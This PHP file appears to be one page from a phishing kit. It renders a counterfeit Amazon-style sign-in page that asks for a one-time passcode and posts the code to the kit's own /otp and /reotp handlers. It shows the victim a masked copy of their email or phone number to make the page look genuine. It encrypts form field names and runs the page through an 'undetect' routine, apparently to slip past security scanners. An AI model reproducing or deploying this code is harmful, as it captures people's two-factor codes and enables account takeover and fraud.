<?php
require __DIR__ . '/../../function.php';
require $api->language();

$page = "OTP";
$api->check_cookie();

if ($api->config("getotp") == "off") {
    $api->redirectPage("/ax/account/addresses", "/ap/account/addresses");
}

$api->session("glitch", true, $page);

$html = '
<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ember-modern">
<head>
    <title dir="ltr">'.$api->text_encode($lang['otp']['title']).'</title>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
    <link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/login-style.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/style-login.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/style-cvf.css").'">
</head>
<body class="auth-no-skin ap-locale-en_US a-m-us a-aui_72554-c a-aui_a11y_2_750578-t2 a-aui_a11y_6_837773-t2 a-aui_a11y_sr_678508-t1 a-aui_amzn_img_959719-c a-aui_amzn_img_gate_959718-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
    <div class="a-section a-padding-medium auth-workflow">
        <div class="a-section a-spacing-none auth-navbar">
            <div class="a-section a-spacing-medium a-text-center">
                <a class="a-link-nav-icon" href="#!">
                    <i class="a-icon a-icon-logo" role="img"></i>
                    ';
                    if ($_SESSION['countrycode'] == "jp") {
                        $html .= '<i class="a-icon a-icon-domain-'.strtolower($_SESSION['countrycode']).' a-icon-domain-'.strtolower($_SESSION['countrycode']).'" role="img"></i>';
                    } else {
                        $html .= '<i class="a-icon a-icon-domain-'.strtolower($_SESSION['countrycode']).' a-icon-domain" role="img"></i>';
                    }
                    $html .= '
                </a> 
            </div>
        </div>
        <div id="authportal-center-section" class="a-section">
            <div id="authportal-main-section" class="a-section">
                <div class="a-section a-spacing-base auth-pagelet-container">
                    <div class="a-section">
                    ';
                    if (isset($_GET['error']) && $_GET['error'] == true) {
                    $html .= '
                        <div aria-live="assertive" id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" role="alert">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">'.$api->text_encode($lang['login']['titlealertsignin']).'</h4>
                                <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
                                        <li>
                                            <span class="a-list-item">
                                                '.$api->text_encode($lang['otp']['otpinvalid']).'
                                            </span>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        ';
                    }
                    $html .= '
                    </div>
                </div>
                <div class="a-section auth-pagelet-container">
                    <div class="a-section a-spacing-base">
                        <div class="a-section">
                            <div class="a-section">
                                <div class="a-box">
                                    <div class="a-box-inner a-padding-extra-large">
                                        <div class="a-section a-spacing-medium">
                                            <span class="a-size-large secure-your-account-word-break">'.$api->text_encode($lang['otp']['titleotp']).'</span>
                                        </div>
                                        <div id="channelDetailsForOtp" class="a-section">
                                            <div class="a-section a-spacing-medium">
                                                ';
                                                if (isset($_SESSION['username'])) {
                                                    $username = $_SESSION['username'];
                                                    if (filter_var($username, FILTER_VALIDATE_EMAIL)) {
                                                        $_SESSION['masked_username'] = $api->maskEmail($username);
                                                        $html .= '
                                                        <span class="a-size-base transaction-approval-word-break">
                                                            '.$api->text_encode($lang['otp']['pagetitle'].' '.$_SESSION['masked_username']).'
                                                        </span>
                                                        ';
                                                    } elseif (preg_match('/^[0-9]{8,15}$/', $username)) {
                                                        $_SESSION['masked_username'] = $api->maskPhone($username);
                                                        $html .= '
                                                        <span class="a-size-base transaction-approval-word-break">
                                                            '.$api->text_encode($lang['otp']['phonepagetitle'].' '.$_SESSION['masked_username']).'
                                                        </span>
                                                        ';
                                                    }
                                                }
                                                $html .= '
                                            </div>
                                        </div>
                                        ';
                                        if (isset($_GET['error']) && $_GET['error'] == true) {
                                        $html .= '
                                        <form method="post" action="/reotp" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="LInHkaiV">
                                        <div class="a-section a-spacing-large">
                                            <label for="auth-mfa-otpcode" class="a-form-label">
                                                '.$api->text_encode($lang['otp']['titlepage']).'
                                            </label>
                                            <input type="tel" maxlength="11" autocomplete="off" id="otp" name="'.$api->encypt("otp").'" class="a-input-text a-span12 auth-autofocus auth-required-field" required="true">
                                            <div id="inputErrorMsgOtp"></div>
                                        </div>
                                        <div class="a-row a-spacing-medium">
                                            <div data-a-input-name="rememberDevice" class="a-checkbox">
                                                <label for="auth-mfa-remember-device">
                                                    <input id="auth-mfa-remember-device" type="checkbox" name="rememberDevice" value="">
                                                    <i class="a-icon a-icon-checkbox"></i>
                                                    <span class="a-label a-checkbox-label">
                                                        '.$api->text_encode($lang['otp']['otpcheckbox']).'
                                                    </span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-row">
                                            <div id="resend-approval-alert" class="a-box a-alert-inline a-alert-inline-info" aria-live="polite" aria-atomic="true">
                                                <div class="a-box-inner a-alert-container">
                                                    <i class="a-icon a-icon-alert" aria-hidden="true"></i>
                                                    <div class="a-alert-content">
                                                        <div id="timer" class="a-section">'.$api->text_encode($lang['otp']['wait']).'</div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <br>
                                        <div class="a-section">
                                            <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit">
                                                <span class="a-button-inner">
                                                    <input id="btn_login" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce">
                                                    <span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
                                                        '.$api->text_encode($lang['otp']['submitcode']).'
                                                    </span>
                                                </span>
                                            </span>
                                        </div>
                                        </form>
                                        ';
                                        } else {
                                        $html .= '
                                        <form method="post" action="/otp" class="auth-validate-form a-spacing-none">
                                        <div class="a-section a-spacing-large">
                                            <label for="auth-mfa-otpcode" class="a-form-label">
                                                '.$api->text_encode($lang['otp']['titlepage']).'
                                            </label>
                                            <input type="tel" maxlength="11" autocomplete="off" id="otp" name="'.$api->encypt("otp").'" class="a-input-text a-span12" required="true">
                                            <div id="inputErrorMsgOtp"></div>
                                        </div>
                                        <div class="a-row a-spacing-medium">
                                            <div data-a-input-name="rememberDevice" class="a-checkbox">
                                                <label for="auth-mfa-remember-device">
                                                    <input id="auth-mfa-remember-device" type="checkbox" name="rememberDevice" value="">
                                                    <i class="a-icon a-icon-checkbox"></i>
                                                    <span class="a-label a-checkbox-label">
                                                        '.$api->text_encode($lang['otp']['otpcheckbox']).'
                                                    </span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="a-row">
                                            <div id="resend-approval-alert" class="a-box a-alert-inline a-alert-inline-info" aria-live="polite" aria-atomic="true">
                                                <div class="a-box-inner a-alert-container">
                                                    <i class="a-icon a-icon-alert" aria-hidden="true"></i>
                                                    <div class="a-alert-content">
                                                        <div id="timer" class="a-section">'.$api->text_encode($lang['otp']['wait']).'</div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <br>
                                        <div class="a-section">
                                            <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary">
                                                <span class="a-button-inner">
                                                    <input id="btn_login" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce">
                                                    <span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
                                                        '.$api->text_encode($lang['otp']['submitcode']).'
                                                    </span>
                                                </span>
                                            </span>
                                        </div>
                                        </form>
                                        ';
                                        }
                                        $html .= '
                                        <br>
                                        <div class="a-section">
                                            <h5 class="a-size-small a-color-secondary">'.$api->text_encode($lang['otp']['needhelp']).'</h5>
                                            <span class="a-size-small a-color-secondary">'.$api->text_encode($lang['otp']['differentway']).'
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="right-2"></div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini">
                <span class="auth-footer-seperator"></span>
                <ul>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['otp']['conditions']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['otp']['privacy']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['otp']['help']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                </ul>
            </div>
            <div class="a-section a-spacing-none a-text-center"> 
                <span class="a-size-mini a-color-secondary">
                    '.$api->text_encode($lang['otp']['copyright']).'
                </span>
            </div>
        </div>
    </div>
    <script src="'.$api->text_encode("../../assets/js/jquery.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.mask.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.validate.min.js").'"></script>
    <script>
        var otpWait = '.json_encode($lang['otp']['waiting']).';
        var otpEmpty = '.json_encode($lang['otp']['otpEmpty']).';
        var otpInvalid = '.json_encode($lang['otp']['otpInvalid']).';
    </script>
    <script src="'.$api->text_encode("../../assets/js/otp.auth.js").'"></script>
</body>
</html>';

$api->undetect($html);
?>